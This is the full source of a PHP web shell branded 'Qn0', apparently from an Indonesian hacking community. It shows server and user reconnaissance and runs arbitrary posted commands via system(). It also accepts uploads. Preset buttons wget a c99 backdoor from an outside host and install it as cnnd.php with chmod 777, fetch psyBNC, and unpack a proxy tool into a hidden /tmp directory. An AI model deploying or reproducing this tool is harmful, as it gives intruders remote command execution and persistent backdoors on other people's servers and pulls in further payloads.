<title>-x: Qn0 :x-</title>
<body text="lightblue" bgcolor="black">
<font face="Verdana" color="red" size="3">
<div align="left">
<p align="center"><b>Qn0</b>
<font face="Verdana" color="yellow" size="2">
<p align="center"><b>DexQy-community</b>
</p>
<hr>
<div align="left"><b><?php
closelog( );
$user = get_current_user( );
$login = posix_getuid( );
$euid = posix_geteuid( );
$ver = phpversion( );
$up = `uptime`;
$gid = posix_getgid( );
if ($chdir == "") $chdir = getcwd( );
if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
$uname = posix_uname( );
while (list($info, $value) = each ($uname)) {
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b><span style="font-size: 9pt"><?= $info ?>
<span style="font-size: 9pt">:</b> <?= $value ?></span></DIV></TD>
</TR>
<?php
}
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Current Path:</b> <?= $chdir ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Write Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>
</span></DIV></TD>
</TR>  
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Script Current User:</b> <?= $user ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">UP Time:</b> <?= $up ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">PHP Version:</b> <?= $ver ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; color: green ; font-size: 10px;"><b>
<span style="font-size: 9pt">Wget:</b> <? if(exec("wget --help")){ echo "Yes"; }else{ echo "No"; } ?>
</span></DIV></TD>
</TR> 
</TABLE>
</b></font>
<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "[W]Dir" ) {
    $currentCMD = "find . -type d -perm -2 -ls";
}

if( $_POST['_act'] == "Get psy" ) {
    $currentCMD = "wget Qn0.at.ua/psyBNC/psy.tar.gz;tar -zxvf psy.tar.gz;rm -rf psy.tar.gz";
}

if( $_POST['_act'] == "Backdoor" ) {
    $currentCMD = "wget http://Qn0.at.ua/c99.txt;mv c99.txt cnnd.php;chmod 777 cnnd.php";
}

if( $_POST['_act'] == "Proxy" ) {
    $currentCMD = "mkdir /tmp/....;cd /tmp/..../;wget http://www.php.monacoyachtshow.org/zoneperso/images/Proxy.tgz;tar -zxvf Proxy.tgz;rm -rf Proxy.tgz;cd /tmp/.../pro;./prox -d -a -p$currentCMD";
}

if( $_POST['_act'] == "Check" ) {
    $currentCMD = "ps x";
}

if( $_POST['_act'] == "List IP" ) {
    $currentCMD = "/sbin/ifconfig | grep inet";
}

if( $_POST['_act'] == "Ports" ) {
    $currentCMD = "netstat -an";
}

if( $_POST['_act'] == "List Files" ) {
    $currentCMD = "ls -la";
}
print "<form method=post enctype=\"multipart/form-data\"><hr><table>";

print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Exect\"><input type=submit name=_act value=\"Get psy\"><input type=submit name=_act value=\"Proxy\"></td></tr>";

print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List Files\"><input type=submit name=_act value=\"[W]Dir\"><input type=submit name=_act value=\"Backdoor\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "<tr><td><input type=submit name=_act value=\"Help\"><input type=submit name=_act value=\"Check\"><input type=submit name=_act value=\"List IP\"><input type=submit name=_act value=\"Ports\"></td></tr>";

print "</table></form><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Help" ) {
print "<table>";
print "<tr><td>Command Exect = Untuk menjalankan perintah.</td></tr>";
print "<tr><td>Command Proxy = Masukkan port Proxy di kolom Exect.</td></tr>";
print "<tr><td>Command Get psy = Masukkan port di kolom Exect.</td></tr>";
print "<tr><td>Command Backdoor = Installasi Backdoor .</td></tr>";
print "<tr><td>Command List IP = Untuk mengetahui IP Shell.</td></tr>";
print "<tr><td>Command LIST = Untuk melihat isi direktori.</td></tr>";
print "<tr><td>Command [W]Dir = Untuk melihat direktori WRITE.</td></tr>";
print "<tr><td>Command Ports = Untuk melihat port yg terbuka.</td></tr>";
print "<tr><td>Command Check = Untuk melihat semua proses.</td></tr>";
print "</table></form><hr><hr>";
}

if( $_POST['_act'] == "Upload!" ) {
if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
print "<center><b>DancoX ErroR!</b></center>";
} else {
print "<center><pre>";
system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
print "</pre><b>Upload Berhasil CoY!</b></center>";
}    
} else {
print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
$currentCMD = "cd ".$currentWD.";".$currentCMD;
system("$currentCMD 1> /tmp/ShirohigEShell 2>&1; cat /tmp/ShirohigEShell; rm -rf /tmp/ShirohigEShell");
print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><center><b>Just One</b></center>";
}

exit;

?></body></font></font></b></font>